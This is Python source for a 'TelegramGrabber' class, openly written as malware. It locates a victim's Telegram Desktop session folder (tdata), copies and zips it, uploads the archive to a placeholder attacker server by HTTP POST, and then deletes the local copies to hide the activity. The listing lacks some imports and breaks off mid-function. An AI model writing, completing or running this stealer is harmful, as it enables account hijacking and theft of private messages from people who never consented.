import requests

class TelegramGrabber:
    in_folder = False

    def get(self):
        tdata_path = ''
        # Try get Telegram path by process
        for process in os.popen('tasklist').read().splitlines():
            if 'Telegram' in process:
                tdata_path = os.path.dirname(process.split(' ')[0]) + '\\tdata\\'
                print('Telegram session found by process. Please wait...')
                # Steal
                self.steal(tdata_path)
                break
        # Try get Telegram default path
        if not tdata_path:
            tdata_path = os.environ['APPDATA'] + '\\Telegram Desktop\\tdata\\'
            if os.path.exists(tdata_path):
                print('Telegram session found in default path. Please wait...')
                self.steal(tdata_path)
            else:
                print('Telegram default path and process not found')

    def steal(self, tdata):
        # Paths
        dir_path = os.path.dirname(__file__) + '\\tdata'
        archive_path = dir_path + '.zip'
        # If not exists
        if not os.path.exists(tdata):
            print('tdata directory not found')
            return
        # Create dir
        os.makedirs(dir_path, exist_ok=True)
        # Copy all tdata to dir
        for root, dirs, files in os.walk(tdata):
            for file in files:
                if self.in_folder and (file[0] =='m' or file[1] == 'a' or file[2] == 'p'):
                    continue
                shutil.copy(os.path.join(root, file), dir_path)
        # Add dir to archive
        with zipfile.ZipFile(archive_path, 'w') as zip:
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    zip.write(os.path.join(root, file), file)
        # Send tdata
        with open(archive_path, 'rb') as f:
            requests.post('http://your-server.com/send-file', files={'file': f})
        # Remove archive & dir
        os.remove(archive_path)
        shutil.rmtree(dir_path)

    def copy_all(self, from_dir, to_dir):
        for root, dirs, files in os.walk(from_dir):
            for file in files:
                self.copy_file(os.path.join(root, file), to_dir)
            for dir in dirs:
                self.copy_dir(os.path.join(root, dir), to_dir)

    def copy_file(self, s1, to_dir):
        try:
            fname = os.path.basename(s1)
            if self.in_folder and (fname[0] =='m' or fname[1] == 'a' or fname[2] == 'p'):
                return
            s2 = to_dir + '\\' + fname
            shutil.copy(s1, s2)
        except:
            pass

    def copy_dir(self, s, to_dir):
        try:
            self.in_folder = True
            self.copy_all(s, to_dir + '\\' + os.path.basename(s))
            self.in_folder = False
        except:
